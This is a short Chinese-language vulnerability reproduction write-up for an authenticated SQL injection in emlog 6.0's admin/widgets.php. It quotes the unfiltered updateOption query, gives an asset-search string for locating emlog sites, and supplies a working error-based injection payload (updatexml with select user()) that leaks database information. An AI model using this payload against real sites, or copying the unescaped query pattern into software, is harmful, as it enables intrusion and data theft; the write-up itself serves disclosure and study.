# emlog widgets.php 后台SQL注入漏洞

## 漏洞描述

emlog widgets.php文件在登录后通过构造特殊语句导致SQL注入，获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>emlog 6.0 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="EMLOG"</a-checkbox></br>

## 漏洞复现

产品主页

```python
https://github.com/emlog/emlog
```

![img](../../../.vuepress/public/img/1634002177714-22159b01-c44f-476a-bb4f-8363cceb9460.png)

存在漏洞的文件为 `admin/widgets.php`

![img](../../../.vuepress/public/img/1634002231213-67b50259-52f0-4cf0-983b-fc1a88cc6471.png)

```python
if ($action == 'compages') {
    $wgNum = isset($_POST['wgnum']) ? intval($_POST['wgnum']) : 1;//侧边栏编号 1、2、3 ……
    $widgets = isset($_POST['widgets']) ? serialize($_POST['widgets']) : '';
    Option::updateOption("widgets{$wgNum}", $widgets);
    $CACHE->updateCache('options');
    emDirect("./widgets.php?activated=true&wg=$wgNum");
}
```

传参为 wgnum 和 widgets ，跟踪方法 `updateOption`

![img](../../../.vuepress/public/img/1634002837216-c1000372-81ea-4671-bc5d-c378110d93db.png)

```python
static function updateOption($name, $value, $isSyntax = false){
        $DB = Database::getInstance();
        $value = $isSyntax ? $value : "'$value'";
        $DB->query('UPDATE '.DB_PREFIX."options SET option_value=$value where option_name='$name'");
    }
```

可以发现对传入的参数木有进行过滤，构造Payload

```python
POST /admin/widgets.php?action=compages

widgets=1' and updatexml(0x3a,concat(1,(select user())),1)-- 
```

调试后可以发现，数据库报错语句会回显至页面中，报错注入即可获取敏感信息

![img](../../../.vuepress/public/img/1634002917512-820b18c8-d37a-4507-974c-1ba9c2afc2ed.png)![img](../../../.vuepress/public/img/1634003089227-452c8b4e-d367-4f01-af1f-e90a79bfd91f.png)